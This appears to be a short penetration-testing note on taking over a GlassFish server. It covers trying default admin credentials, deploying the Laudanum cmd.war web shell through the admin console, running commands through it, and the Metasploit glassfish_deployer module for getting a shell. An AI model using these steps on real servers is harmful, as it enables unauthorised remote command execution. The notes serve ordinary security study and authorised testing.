# Glass Fish
Search google for default admin username and passwords used for the version 

We can use the **Deploy an Application** functionality to deploy a WAR application.

The war file is located at **/usr/share/laudanum/jsp/cmd.war**
*Select the cmd.war*
*Type as Web Application*
*Context Root as cmd*
*Application Name as cmd* 
*Virtual Servers as server*
*Status enable*
*Implicit CDI enable*

Click OK and launch the application. 
Finally browse to the location where the application was deplpoyed and execute commands using: 
```
cmd.exe /c powershell ….
```

You can also use the metasploit module to auto check for vulnerabilities and spawn a shell.
```
use exploit/multi/http/glassfish_deployer
```
